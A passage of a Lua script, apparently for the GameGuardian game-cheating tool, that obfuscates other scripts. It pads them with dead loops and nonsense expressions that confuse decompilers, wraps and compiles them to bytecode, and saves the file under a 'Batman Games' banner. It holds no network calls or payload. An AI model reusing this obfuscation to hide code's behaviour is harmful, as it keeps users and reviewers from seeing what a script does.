while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;local a = {1,2,3,4,5,6,7,8};a[1] += a[2] + a[3];a[8] -= a[5] + 666 + 3;b = 2222;b *= a[3];c = 233;c /= 3;d = 233;d %= 3;e = 5;e^=3;b = 5;b //= 2;c = 233;c &= 3;d = 64;d |= 128;d = 64;d ~= 12;e = "666";e ..= "999";d = 1;d <<= 3;e = 0xff;e >>= 4;local j = {v = 88.0};local mt = {__div = function(a,b) if type(a) == "table" and type(b)=="number" then return a.v/b elseif type(a) == "number" and type(b)=="table" then return a/b.v else return "error" end end };setmetatable(j,mt);k = 88888.0;k/=j
    local texto_original = string.baseCode(aes_descriptografado, "de")
while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;local a = {1,2,3,4,5,6,7,8};a[1] += a[2] + a[3];a[8] -= a[5] + 666 + 3;b = 2222;b *= a[3];c = 233;c /= 3;d = 233;d %= 3;e = 5;e^=3;b = 5;b //= 2;c = 233;c &= 3;d = 64;d |= 128;d = 64;d ~= 12;e = "666";e ..= "999";d = 1;d <<= 3;e = 0xff;e >>= 4;local j = {v = 88.0};local mt = {__div = function(a,b) if type(a) == "table" and type(b)=="number" then return a.v/b elseif type(a) == "number" and type(b)=="table" then return a/b.v else return "error" end end };setmetatable(j,mt);k = 88888.0;k/=j
    return texto_original
end
local _ENV = _ENV
local function x_x(x) 
    local pattern = " while \"\"==\"\" do end if nil then goto s ::s:: end"
    return string.rep(pattern, x) 
end
for _ = 1, 0 do
    S = 'Blocker[Spam](Spam2)'
    if ({}).N then ({}).N = ({}).N() end    
    local v = _ENV[35]
    for i = 1, 24 do
        v = _ENV[v]
        v = {v, v}
    end
    for _ = 1, 9 do
        for _ = 1, 4 do goto s ::s:: end
        for _ = {}, 0, {} do goto t ::t:: end
        for _ = {}, {}, {} do goto u ::u:: end
    end
end
for _ = 1, 0 do
    for i = 1, 12 do
        local v = _ENV[35]
        v = _ENV[v]
        v = {v, v, false}
    end
end
while nil do
    local o, _o_, po = {}, {}, {}
    for _ = 1, 3 do
        _ = _[_] or _(_)
        o.po = o._o_ and o._o_() or nil
    end
    if o._o_ ~= _[nil] then
        for _ = 1, 3 do
            _ = _[_] or _(_)
            o.po = o._o_ and o._o_() or nil
        end
        o._o_, o.po = _[nil], _[nil]
    end
    o, po, _o_ = _[nil], _[nil], _[nil]
end
if nil then
    while _ do return end
end
if nil then 
    if true then else goto x end 
    ::x::
    if nil then 
        while _ do return end 
    end 
end
do
    local _env = setmetatable({}, {__index = _G})
    local function random_op(a, b)
        local ops = {function(x,y) return x + y end, function(x,y) return x - y end}
        return ops[math.random(2)](a, b)
    end
    for i = 1, math.random(2, 4) do
        if math.random() > 0.6 then break end
    end
    local _ss = {}
    _ss["ss"] = nil
    if _ss["ss"] ~= nil then
        _ss["bidun"] = _ss["ss"]()
        _ss["ss"] = random_op(nil, math.random())
    end
    _ss = nil
    collectgarbage()
end
]]
newContent = "(function(...)" .. newContent .. ([[ 
end)([=[     

╔═════════════════════╗
║                                                    
║          ⛧ ᴇɴᴄʀʏᴘᴛɪᴏɴ ⁅ʟᴜᴀJava⁆ ⛧
║   ⛧ ᴇɴᴄʀʏᴘᴛ ʙʏ: ʙᴀᴛᴍᴀɴ ɢᴀᴍᴇs  ⛧              
║                                                    
║        ⛧❖ @ʙᴀᴛᴍᴀɴɢᴀᴍᴇss ❖⛧                       
║                                                    
╚═════════════════════╝

     
]=])
]]) 

newContent = newContent .. "\n" .. DATA

io.open(g.out,"w"):write(string.gsub(string.dump(load(newContent), true), 'LuaR', 'LuaR', 1)):close()

gg.alert('📂 File Saved To: '..g.out..'\n', 'Success')
print("\n▬▬▬▬▬▬▬▬▬▬▬▬▬\n📂 File Saved To: " .. g.out .. "\n▬▬▬▬▬▬▬▬▬▬▬▬▬")

return